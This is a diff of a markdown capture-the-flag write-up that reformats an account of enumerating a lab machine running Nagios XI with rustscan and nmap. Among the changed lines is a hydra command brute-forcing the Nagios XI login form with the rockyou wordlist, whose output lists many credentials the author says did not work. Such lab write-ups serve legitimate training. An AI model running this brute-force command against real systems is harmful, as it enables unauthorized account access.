@@ -1,6 +1,6 @@
 ### to complete this ctf i used to perform simple enumeration the machine
 
-### firstly added the ip to hosts
+### 1. firstly added the ip to hosts
 <pre>
 
 192.168.49.126  my.addr
@@ -14,11 +14,12 @@ ff02::2    ip6-allrouters
 </pre>
 
 
-<h3><b>
- then i did network scan and i found some ports opened as shown below (firstly i did scan with rust and then i did nmap scan on ports found in rust scan)
- </b></h3>
+<h3><b><i>
+ 2. then i did network scan and i found some ports opened as shown below (firstly i did scan with rust and then i did nmap scan on ports found in rust scan)
+ </i></b></h3>
 
-##rustscan-results
+<h3><b><i>rustscan-results</i></b></h3>
+
 <pre>
 ┌[linspace]─[14:27-10/08]─[/home/sp1d3y]
 └╼sp1d3y$rustscan -a hack.thm
@@ -74,7 +75,7 @@ Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds
 </pre>
 
-##nmap-results
+<h3><b><i>nmap-results</i></b></h3>
 <pre>
 ┌[linspace]─[14:27-10/08]─[/home/sp1d3y]
 └╼sp1d3y$nmap -A -sV -p 22,25,80,389,443,5667 hack.thm 
@@ -114,13 +115,14 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 24.08 seconds
 </pre>
 
-###during this network scan i was trying to find something on port 80 and i found that port 80 runs a servie called nagios_xi monitoring tool
+<h3><b><i>during this network scan i was trying to find something on port 80 and i found that port 80 runs a servie called nagios_xi monitoring tool</h3></b></i>
 
-##then i found a login page on the port 80 as shown below
+<h3><b><i>then i found a login page on the port 80 as shown below</h3></b></i>
 
-##i also did directory enumeration but didn't got the lead so ("directory enum")
-##i tried to brute force that login form
-***************
+<h3><b><i>i also did directory enumeration but didn't got the lead so ("directory enum")</h3></b></i>
+<h3><b><i>i tried to brute force that login form</h3></b></i>
+
+<pre>
 ┌[linspace]─[15:42-10/08]─[/home/sp1d3y]
 └╼sp1d3y$ hydra hack.thm http-post-form '/nagiosxi/login.php:username=^USER^&password=^PASS^:login' -L user.txt -P /usr/share/wordlists/rockyou.txt -t 64
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -172,7 +174,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-10 15:42:
 [80][http-post-form] host: hack.thm   login: root   password: ashley1
 1 of 1 target successfully completed, 41 valid passwords found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-10 15:44:36
-*****************
+</pre>
 
 ##but none of these credentials worked may be bcuz i did something wrong in command
 ###then i looked at nmap scan again and looked for other ports but didn't find good stuff
